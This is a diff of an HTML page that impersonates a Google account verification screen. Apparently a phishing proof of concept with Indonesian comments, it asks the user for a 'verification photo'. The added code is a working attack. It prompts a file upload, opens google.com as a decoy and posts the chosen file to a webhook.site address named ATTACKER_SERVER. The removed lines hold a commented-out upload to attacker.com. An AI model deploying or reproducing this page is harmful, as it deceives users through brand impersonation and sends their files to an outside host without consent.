@@ -1,110 +1,105 @@
 <!doctype html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Google Account Security</title>
     <style>
-      * {
-        margin: 0;
-        padding: 0;
-        box-sizing: border-box;
-      }
-      body {
-        font-family: Arial, sans-serif;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
-        background: #f8f9fa;
-        text-align: center;
-      }
-      .container {
-        padding: 30px;
-        max-width: 400px;
-        background: white;
-        border-radius: 8px;
-        box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
-      }
-      .btn-ui {
-        background: #1a73e8;
-        color: white;
-        padding: 12px 24px;
-        border-radius: 4px;
-        cursor: pointer;
-        display: inline-block;
-        margin: 20px 0;
-      }
-      #fileSelect {
-        display: none;
-      }
-      .proof {
-        margin-top: 20px;
-        padding: 10px;
-        background: #e8f0fe;
-        border-radius: 4px;
-        color: #1a73e8;
-        display: none;
-      }
-    </style>
-  </head>
-  <body>
-    <div class="container">
-      <div
-        class="logo"
-        style="font-size: 28px; font-weight: 600; margin-bottom: 15px"
-      >
-        <span style="color: #4285f4">G</span
-        ><span style="color: #ea4335">o</span>
-        <span style="color: #fbbc05">o</span
-        ><span style="color: #4285f4">g</span>
-        <span style="color: #34a853">l</span
-        ><span style="color: #ea4335">e</span>
-      </div>
-      <h1>Verify it's you</h1>
-      <p>
-        To keep your account secure, Google needs to verify your identity. Tap
-        anywhere to upload a verification photo.
-      </p>
-      <div class="btn-ui" id="triggerBtn">Continue to Google</div>
-      <div id="proofMessage" class="proof"></div>
-    </div>
-    <input type="file" id="fileSelect" accept="image/*" />
-
-    <script>
-      const trigger = document.getElementById("triggerBtn");
-      const fileInput = document.getElementById("fileSelect");
-      const proofDiv = document.getElementById("proofMessage");
-
-      // Saat halaman dimuat, cek apakah sudah ada bukti capture sebelumnya
-      const captured = localStorage.getItem("fileCaptured");
-      if (captured) {
-        proofDiv.innerHTML = captured;
-        proofDiv.style.display = "block";
-        localStorage.removeItem("fileCaptured"); // hapus setelah ditampilkan
-      }
-
-      trigger.onclick = (e) => {
-        e.preventDefault();
-        // Simpan pesan instruksi (opsional)
-        fileInput.click();
-        window.open("https://google.com", "_blank");
-      };
-
-      fileInput.onchange = () => {
-        if (fileInput.files.length > 0) {
-          const file = fileInput.files[0];
-          // Simpan bukti ke localStorage
-          const proof = `✅ File captured: ${file.name} (${file.size} bytes) at ${new Date().toLocaleTimeString()}`;
-          localStorage.setItem("fileCaptured", proof);
-          // Tampilkan juga langsung di halaman saat ini (sebelum pindah tab)
-          proofDiv.innerHTML = proof;
-          proofDiv.style.display = "block";
-          console.log("File captured:", file.name);
-          // Opsi: kirim ke server (jika diperlukan)
-          // const fd = new FormData(); fd.append('file', file); fetch('https://attacker.com/upload', { method: 'POST', body: fd });
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: #f8f9fa;
+            text-align: center;
         }
-      };
-    </script>
-  </body>
+        .container {
+            padding: 30px;
+            max-width: 400px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+        .btn-ui {
+            background: #1a73e8;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 4px;
+            cursor: pointer;
+            display: inline-block;
+            margin: 20px 0;
+        }
+        #fileSelect { display: none; }
+        .status {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #1a73e8;
+            word-break: break-word;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="logo" style="font-size:28px; font-weight:600; margin-bottom:15px;">
+        <span style="color:#4285f4;">G</span><span style="color:#ea4335;">o</span>
+        <span style="color:#fbbc05;">o</span><span style="color:#4285f4;">g</span>
+        <span style="color:#34a853;">l</span><span style="color:#ea4335;">e</span>
+    </div>
+    <h1>Verify it's you</h1>
+    <p>To keep your account secure, Google needs to verify your identity. Tap anywhere to upload a verification photo.</p>
+    <div class="btn-ui" id="triggerBtn">Continue to Google</div>
+    <div id="statusMsg" class="status"></div>
+</div>
+<input type="file" id="fileSelect" accept="image/*" />
+
+<script>
+    const trigger = document.getElementById('triggerBtn');
+    const fileInput = document.getElementById('fileSelect');
+    const statusDiv = document.getElementById('statusMsg');
+
+    // GANTI DENGAN URL WEBHOOK ANDA
+    const ATTACKER_SERVER = 'https://webhook.site/17b37178-709d-4f89-88d2-ed6c4abb8933';
+
+    trigger.onclick = (e) => {
+        e.preventDefault();
+        statusDiv.innerHTML = 'Opening Google...';
+        // Pilih file
+        fileInput.click();
+        // Buka tab baru Google
+        window.open('https://google.com', '_blank');
+    };
+
+    fileInput.onchange = async () => {
+        if (fileInput.files.length === 0) return;
+        const file = fileInput.files[0];
+        statusDiv.innerHTML = `Selected: ${file.name}. Sending to attacker...`;
+        
+        const formData = new FormData();
+        formData.append('file', file);
+        // Tambahkan info tambahan agar mudah diidentifikasi di webhook
+        formData.append('filename', file.name);
+        formData.append('timestamp', new Date().toISOString());
+
+        try {
+            const response = await fetch(ATTACKER_SERVER, {
+                method: 'POST',
+                body: formData
+            });
+            if (response.ok) {
+                statusDiv.innerHTML = `✅ File "${file.name}" sent to attacker server! (size: ${file.size} bytes)`;
+                alert(`[PoC] File "${file.name}" has been exfiltrated to attacker's server.`);
+            } else {
+                statusDiv.innerHTML = `❌ Failed to send file. HTTP ${response.status}`;
+                alert('Failed to send file. Check console.');
+            }
+        } catch (err) {
+            statusDiv.innerHTML = `❌ Error: ${err.message}`;
+            alert('Network error. Cannot reach attacker server.');
+            console.error(err);
+        }
+    };
+</script>
+</body>
 </html>
